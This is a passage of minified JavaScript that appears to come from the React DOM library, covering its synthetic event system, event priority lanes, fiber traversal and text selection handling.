Error(A(61))}if(n.style!=null&&typeof n.style!="object")throw Error(A(62))}}function ga(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ya=null;function wl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var va=null,Tt=null,Ct=null;function To(e){if(e=Vs(e)){if(typeof va!="function")throw Error(A(280));var n=e.stateNode;n&&(n=fi(n),va(e.stateNode,e.type,n))}}function Cu(e){Tt?Ct?Ct.push(e):Ct=[e]:Tt=e}function Pu(){if(Tt){var e=Tt,n=Ct;if(Ct=Tt=null,To(e),n)for(e=0;e<n.length;e++)To(n[e])}}function Au(e,n){return e(n)}function Lu(){}var Oi=!1;function Nu(e,n,t){if(Oi)return e(n,t);Oi=!0;try{return Au(e,n,t)}finally{Oi=!1,(Tt!==null||Ct!==null)&&(Lu(),Pu())}}function ws(e,n){var t=e.stateNode;if(t===null)return null;var s=fi(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(A(231,n,typeof t));return t}var wa=!1;if(hn)try{var Yt={};Object.defineProperty(Yt,"passive",{get:function(){wa=!0}}),window.addEventListener("test",Yt,Yt),window.removeEventListener("test",Yt,Yt)}catch{wa=!1}function Oh(e,n,t,s,r,i,a,l,o){var c=Array.prototype.slice.call(arguments,3);try{n.apply(t,c)}catch(u){this.onError(u)}}var cs=!1,Or=null,Mr=!1,ka=null,Mh={onError:function(e){cs=!0,Or=e}};function Ih(e,n,t,s,r,i,a,l,o){cs=!1,Or=null,Oh.apply(Mh,arguments)}function zh(e,n,t,s,r,i,a,l,o){if(Ih.apply(this,arguments),cs){if(cs){var c=Or;cs=!1,Or=null}else throw Error(A(198));Mr||(Mr=!0,ka=c)}}function ct(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function Ru(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function Co(e){if(ct(e)!==e)throw Error(A(188))}function Dh(e){var n=e.alternate;if(!n){if(n=ct(e),n===null)throw Error(A(188));return n!==e?null:e}for(var t=e,s=n;;){var r=t.return;if(r===null)break;var i=r.alternate;if(i===null){if(s=r.return,s!==null){t=s;continue}break}if(r.child===i.child){for(i=r.child;i;){if(i===t)return Co(r),e;if(i===s)return Co(r),n;i=i.sibling}throw Error(A(188))}if(t.return!==s.return)t=r,s=i;else{for(var a=!1,l=r.child;l;){if(l===t){a=!0,t=r,s=i;break}if(l===s){a=!0,s=r,t=i;break}l=l.sibling}if(!a){for(l=i.child;l;){if(l===t){a=!0,t=i,s=r;break}if(l===s){a=!0,s=i,t=r;break}l=l.sibling}if(!a)throw Error(A(189))}}if(t.alternate!==s)throw Error(A(190))}if(t.tag!==3)throw Error(A(188));return t.stateNode.current===t?e:n}function Ou(e){return e=Dh(e),e!==null?Mu(e):null}function Mu(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=Mu(e);if(n!==null)return n;e=e.sibling}return null}var Iu=Re.unstable_scheduleCallback,Po=Re.unstable_cancelCallback,jh=Re.unstable_shouldYield,Bh=Re.unstable_requestPaint,ne=Re.unstable_now,Fh=Re.unstable_getCurrentPriorityLevel,kl=Re.unstable_ImmediatePriority,zu=Re.unstable_UserBlockingPriority,Ir=Re.unstable_NormalPriority,Uh=Re.unstable_LowPriority,Du=Re.unstable_IdlePriority,ui=null,nn=null;function Hh(e){if(nn&&typeof nn.onCommitFiberRoot=="function")try{nn.onCommitFiberRoot(ui,e,void 0,(e.current.flags&128)===128)}catch{}}var qe=Math.clz32?Math.clz32:$h,Vh=Math.log,Wh=Math.LN2;function $h(e){return e>>>=0,e===0?32:31-(Vh(e)/Wh|0)|0}var Js=64,er=4194304;function rs(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function zr(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,r=e.suspendedLanes,i=e.pingedLanes,a=t&268435455;if(a!==0){var l=a&~r;l!==0?s=rs(l):(i&=a,i!==0&&(s=rs(i)))}else a=t&~r,a!==0?s=rs(a):i!==0&&(s=rs(i));if(s===0)return 0;if(n!==0&&n!==s&&!(n&r)&&(r=s&-s,i=n&-n,r>=i||r===16&&(i&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-qe(n),r=1<<t,s|=e[t],n&=~r;return s}function Gh(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Yh(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,r=e.expirationTimes,i=e.pendingLanes;0<i;){var a=31-qe(i),l=1<<a,o=r[a];o===-1?(!(l&t)||l&s)&&(r[a]=Gh(l,n)):o<=n&&(e.expiredLanes|=l),i&=~l}}function ba(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function ju(){var e=Js;return Js<<=1,!(Js&4194240)&&(Js=64),e}function Mi(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Us(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-qe(n),e[n]=t}function qh(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var r=31-qe(t),i=1<<r;n[r]=0,s[r]=-1,e[r]=-1,t&=~i}}function bl(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-qe(t),r=1<<s;r&n|e[s]&n&&(e[s]|=n),t&=~r}}var $=0;function Bu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Fu,xl,Uu,Hu,Vu,xa=!1,nr=[],Ln=null,Nn=null,Rn=null,ks=new Map,bs=new Map,_n=[],Xh="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Ao(e,n){switch(e){case"focusin":case"focusout":Ln=null;break;case"dragenter":case"dragleave":Nn=null;break;case"mouseover":case"mouseout":Rn=null;break;case"pointerover":case"pointerout":ks.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":bs.delete(n.pointerId)}}function qt(e,n,t,s,r,i){return e===null||e.nativeEvent!==i?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:i,targetContainers:[r]},n!==null&&(n=Vs(n),n!==null&&xl(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,r!==null&&n.indexOf(r)===-1&&n.push(r),e)}function Kh(e,n,t,s,r){switch(n){case"focusin":return Ln=qt(Ln,e,n,t,s,r),!0;case"dragenter":return Nn=qt(Nn,e,n,t,s,r),!0;case"mouseover":return Rn=qt(Rn,e,n,t,s,r),!0;case"pointerover":var i=r.pointerId;return ks.set(i,qt(ks.get(i)||null,e,n,t,s,r)),!0;case"gotpointercapture":return i=r.pointerId,bs.set(i,qt(bs.get(i)||null,e,n,t,s,r)),!0}return!1}function Wu(e){var n=Xn(e.target);if(n!==null){var t=ct(n);if(t!==null){if(n=t.tag,n===13){if(n=Ru(t),n!==null){e.blockedOn=n,Vu(e.priority,function(){Uu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function vr(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=Sa(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);ya=s,t.target.dispatchEvent(s),ya=null}else return n=Vs(t),n!==null&&xl(n),e.blockedOn=t,!1;n.shift()}return!0}function Lo(e,n,t){vr(e)&&t.delete(n)}function Qh(){xa=!1,Ln!==null&&vr(Ln)&&(Ln=null),Nn!==null&&vr(Nn)&&(Nn=null),Rn!==null&&vr(Rn)&&(Rn=null),ks.forEach(Lo),bs.forEach(Lo)}function Xt(e,n){e.blockedOn===n&&(e.blockedOn=null,xa||(xa=!0,Re.unstable_scheduleCallback(Re.unstable_NormalPriority,Qh)))}function xs(e){function n(r){return Xt(r,e)}if(0<nr.length){Xt(nr[0],e);for(var t=1;t<nr.length;t++){var s=nr[t];s.blockedOn===e&&(s.blockedOn=null)}}for(Ln!==null&&Xt(Ln,e),Nn!==null&&Xt(Nn,e),Rn!==null&&Xt(Rn,e),ks.forEach(n),bs.forEach(n),t=0;t<_n.length;t++)s=_n[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<_n.length&&(t=_n[0],t.blockedOn===null);)Wu(t),t.blockedOn===null&&_n.shift()}var Pt=vn.ReactCurrentBatchConfig,Dr=!0;function Zh(e,n,t,s){var r=$,i=Pt.transition;Pt.transition=null;try{$=1,Sl(e,n,t,s)}finally{$=r,Pt.transition=i}}function Jh(e,n,t,s){var r=$,i=Pt.transition;Pt.transition=null;try{$=4,Sl(e,n,t,s)}finally{$=r,Pt.transition=i}}function Sl(e,n,t,s){if(Dr){var r=Sa(e,n,t,s);if(r===null)Wi(e,n,s,jr,t),Ao(e,s);else if(Kh(r,e,n,t,s))s.stopPropagation();else if(Ao(e,s),n&4&&-1<Xh.indexOf(e)){for(;r!==null;){var i=Vs(r);if(i!==null&&Fu(i),i=Sa(e,n,t,s),i===null&&Wi(e,n,s,jr,t),i===r)break;r=i}r!==null&&s.stopPropagation()}else Wi(e,n,s,null,t)}}var jr=null;function Sa(e,n,t,s){if(jr=null,e=wl(s),e=Xn(e),e!==null)if(n=ct(e),n===null)e=null;else if(t=n.tag,t===13){if(e=Ru(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return jr=e,null}function $u(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Fh()){case kl:return 1;case zu:return 4;case Ir:case Uh:return 16;case Du:return 536870912;default:return 16}default:return 16}}var Cn=null,_l=null,wr=null;function Gu(){if(wr)return wr;var e,n=_l,t=n.length,s,r="value"in Cn?Cn.value:Cn.textContent,i=r.length;for(e=0;e<t&&n[e]===r[e];e++);var a=t-e;for(s=1;s<=a&&n[t-s]===r[i-s];s++);return wr=r.slice(e,1<s?1-s:void 0)}function kr(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function tr(){return!0}function No(){return!1}function Ie(e){function n(t,s,r,i,a){this._reactName=t,this._targetInst=r,this.type=s,this.nativeEvent=i,this.target=a,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(i):i[l]);return this.isDefaultPrevented=(i.defaultPrevented!=null?i.defaultPrevented:i.returnValue===!1)?tr:No,this.isPropagationStopped=No,this}return J(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=tr)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=tr)},persist:function(){},isPersistent:tr}),n}var Vt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},El=Ie(Vt),Hs=J({},Vt,{view:0,detail:0}),ef=Ie(Hs),Ii,zi,Kt,pi=J({},Hs,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Tl,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==Kt&&(Kt&&e.type==="mousemove"?(Ii=e.screenX-Kt.screenX,zi=e.screenY-Kt.screenY):zi=Ii=0,Kt=e),Ii)},movementY:function(e){return"movementY"in e?e.movementY:zi}}),Ro=Ie(pi),nf=J({},pi,{dataTransfer:0}),tf=Ie(nf),sf=J({},Hs,{relatedTarget:0}),Di=Ie(sf),rf=J({},Vt,{animationName:0,elapsedTime:0,pseudoElement:0}),af=Ie(rf),lf=J({},Vt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),of=Ie(lf),cf=J({},Vt,{data:0}),Oo=Ie(cf),uf={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},pf={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},df={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function hf(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=df[e])?!!n[e]:!1}function Tl(){return hf}var ff=J({},Hs,{key:function(e){if(e.key){var n=uf[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=kr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?pf[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Tl,charCode:function(e){return e.type==="keypress"?kr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?kr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),mf=Ie(ff),gf=J({},pi,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Mo=Ie(gf),yf=J({},Hs,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Tl}),vf=Ie(yf),wf=J({},Vt,{propertyName:0,elapsedTime:0,pseudoElement:0}),kf=Ie(wf),bf=J({},pi,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),xf=Ie(bf),Sf=[9,13,27,32],Cl=hn&&"CompositionEvent"in window,us=null;hn&&"documentMode"in document&&(us=document.documentMode);var _f=hn&&"TextEvent"in window&&!us,Yu=hn&&(!Cl||us&&8<us&&11>=us),Io=" ",zo=!1;function qu(e,n){switch(e){case"keyup":return Sf.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Xu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ft=!1;function Ef(e,n){switch(e){case"compositionend":return Xu(n);case"keypress":return n.which!==32?null:(zo=!0,Io);case"textInput":return e=n.data,e===Io&&zo?null:e;default:return null}}function Tf(e,n){if(ft)return e==="compositionend"||!Cl&&qu(e,n)?(e=Gu(),wr=_l=Cn=null,ft=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return Yu&&n.locale!=="ko"?null:n.data;default:return null}}var Cf={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Do(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Cf[e.type]:n==="textarea"}function Ku(e,n,t,s){Cu(s),n=Br(n,"onChange"),0<n.length&&(t=new El("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var ps=null,Ss=null;function Pf(e){lp(e,0)}function di(e){var n=yt(e);if(ku(n))return e}function Af(e,n){if(e==="change")return n}var Qu=!1;if(hn){var ji;if(hn){var Bi="oninput"in document;if(!Bi){var jo=document.createElement("div");jo.setAttribute("oninput","return;"),Bi=typeof jo.oninput=="function"}ji=Bi}else ji=!1;Qu=ji&&(!document.documentMode||9<document.documentMode)}function Bo(){ps&&(ps.detachEvent("onpropertychange",Zu),Ss=ps=null)}function Zu(e){if(e.propertyName==="value"&&di(Ss)){var n=[];Ku(n,Ss,e,wl(e)),Nu(Pf,n)}}function Lf(e,n,t){e==="focusin"?(Bo(),ps=n,Ss=t,ps.attachEvent("onpropertychange",Zu)):e==="focusout"&&Bo()}function Nf(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return di(Ss)}function Rf(e,n){if(e==="click")return di(n)}function Of(e,n){if(e==="input"||e==="change")return di(n)}function Mf(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Ke=typeof Object.is=="function"?Object.is:Mf;function _s(e,n){if(Ke(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var r=t[s];if(!ia.call(n,r)||!Ke(e[r],n[r]))return!1}return!0}function Fo(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Uo(e,n){var t=Fo(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=Fo(t)}}function Ju(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?Ju(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function ep(){for(var e=window,n=Rr();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=Rr(e.document)}return n}function Pl(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function If(e){var n=ep(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&Ju(t.ownerDocument.documentElement,t)){if(s!==null&&Pl(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var r=t.textContent.length,i=Math.min(s.start,r);s=s.end===void 0?i:Math.min(s.end,r),!e.extend&&i>s&&(r=s,s=i,i=r),r=Uo(t,i);var a=Uo(t,s);r&&a&&(e.rangeCount!==1||e.anchorNode!==r.node||e.anchorOffset!==r.offset||e.focusNode!==a.node||e.focusOffset!==a.offset)&&(n=n.createRange(),n.setStart(r.node,r.offset),e.removeAllRanges(),i>s?(e.addRange(n),e.extend(a.node,a.offset)):(n.setEnd(a.node,a.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var zf=hn&&"documentMode"in document&&11>=document.documentMode,mt=null,_a=null,ds=null,Ea=!1;function Ho(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;Ea||mt==null||mt!==Rr(s)||(s=mt,"selectionStart"in s&&Pl(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),ds&&_s(ds,s)||(ds=s,s=Br(_a,"onSelect"),0<s.length&&(n=new El("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=mt)))}function sr(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var gt={animationend:sr("Animation","AnimationEnd"),animationiteration:sr("Animation","AnimationIteration"),animationstart:sr("Animation","AnimationStart"),transitionend:sr("Transition","TransitionEnd")},Fi={},np={};hn&&(np=document.createElement("div").style,"AnimationEvent"in window||(delete gt.animationend.animation,delete gt.animationiteration.animation,delete gt.animationstart.animation),"TransitionEvent"in window||delete gt.transitionend.transition);function hi(e){if(Fi[e])return Fi[e];if(!gt[e])return e;var n=gt[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in np)return Fi[e]=n[t];return e}var tp=hi("animationend"),sp=hi("animationiteration"),rp=hi("animationstart"),ip=hi("transitionend"),ap=new Map,Vo="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Un(e,n){ap.set(e,n),ot(n,[e])}for(var Ui=0;Ui<Vo.length;Ui++){var Hi=Vo[Ui],Df=Hi.toLowerCase(),jf=Hi[0].toUpperCase()+Hi.slice(1);Un(Df,"on"+jf)}Un(tp,"onAnimationEnd");Un(sp,"onAnimationIteration");Un(rp,"onAnimationStart");Un("dblclick","onDoubleClick");Un("focusin","onFocus");Un("focusout","onBlur");Un(ip,"onTransitionEnd");Ot("onMouseEnter",["mouseout","mouseover"]);Ot("onMouseLeave",["mouseout","mouseover"]);Ot("onPointerEnter",["pointerout","pointerover"]);Ot("onPointerLeave",["pointerout","pointerover"]);ot("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));ot("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));ot("onBeforeInput",["compositionend","keypress","textInput","paste"]);ot("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));ot("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));ot("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var is="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Bf=new Set("cancel close invalid load scroll toggle".split(" ").concat(is));function Wo(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,zh(s,n,void 0,e),e.currentTarget=null}function lp(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],r=s.event;s=s.listeners;e:{var i=void 0;if(n)for(var a=s.length-1;0<=a;a--){var l=s[a],o=l.instance,c=l.currentTarget;if(l=l.listener,o!==i&&r.isPropagationStopped())break e;Wo(r,l,c),i=o}else for(a=0;a<s.length;a++){if(l=s[a],o=l.instance,c=l.currentTarget,l=l.listener,o!==i&&r.isPropagationStopped())break e;Wo(r,l,c),i=o}}}if(Mr)throw e=ka,Mr=!1,ka=null,e}function q(e,n){var t=n[La];t===void 0&&(t=n[La]=new Set);var s=e+"__bubble";t.has(s)||(op(n,e,2,!1),t.add(s))}function Vi(e,n,t){var s=0;n&&(s|=4),op(t,e,s,n)}var rr="_reactListening"+Math.random().toString(36).slice(2);function Es(e){if(!e[rr]){e[rr]=!0,mu.forEach(function(t){t!=="selectionchange"&&(Bf.has(t)||Vi(t,!1,e),Vi(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[rr]||(n[rr]=!0,Vi("selectionchange",!1,n))}}function op(e,n,t,s){switch($u(n)){case 1:var r=Zh;break;case 4:r=Jh;break;default:r=Sl}t=r.bind(null,n,t,e),r=void 0,!wa||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(r=!0),s?r!==void 0?e.addEventListener(n,t,{capture:!0,passive:r}):e.addEventListener(n,t,!0):r!==void 0?e.addEventListener(n,t,{passive:r}):e.addEventListener(n,t,!1)}function Wi(e,n,t,s,r){var i=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var a=s.tag;if(a===3||a===4){var l=s.stateNode.containerInfo;if(l===r||l.nodeType===8&&l.parentNode===r)break;if(a===4)for(a=s.return;a!==null;){var o=a.tag;if((o===3||o===4)&&(o=a.stateNode.containerInfo,o===r||o.nodeType===8&&o.parentNode===r))return;a=a.return}for(;l!==null;){if(a=Xn(l),a===null)return;if(o=a.tag,o===5||o===6){s=i=a;continue e}l=l.parentNode}}s=s.return}Nu(function(){var c=i,u=wl(t),d=[];e:{var h=ap.get(e);if(h!==void 0){var y=El,k=e;switch(e){case"keypress":if(kr(t)===0)break e;case"keydown":case"keyup":y=mf;break;case"focusin":k="focus",y=Di;break;case"focusout":k="blur",y=Di;break;case"beforeblur":case"afterblur":y=Di;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":y=Ro;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":y=tf;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":y=vf;break;case tp:case sp:case rp:y=af;break;case ip:y=kf;break;case"scroll":y=ef;break;case"wheel":y=xf;break;case"copy":case"cut":case"paste":y=of;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":y=Mo}var x=(n&4)!==0,L=!x&&e==="scroll",p=x?h!==null?h+"Capture":null:h;x=[];for(var f=c,m;f!==null;){m=f;var S=m.stateNode;if(m.tag===5&&S!==null&&(m=S,p!==null&&(S=ws(f,p),S!=null&&x.push(Ts(f,S,m)))),L)break;f=f.return}0<x.length&&(h=new y(h,k,null,t,u),d.push({event:h,listeners:x}))}}if(!(n&7)){e:{if(h=e==="mouseover"||e==="pointerover",y=e==="mouseout"||e==="pointerout",h&&t!==ya&&(k=t.relatedTarget||t.fromElement)&&(Xn(k)||k[fn]))break 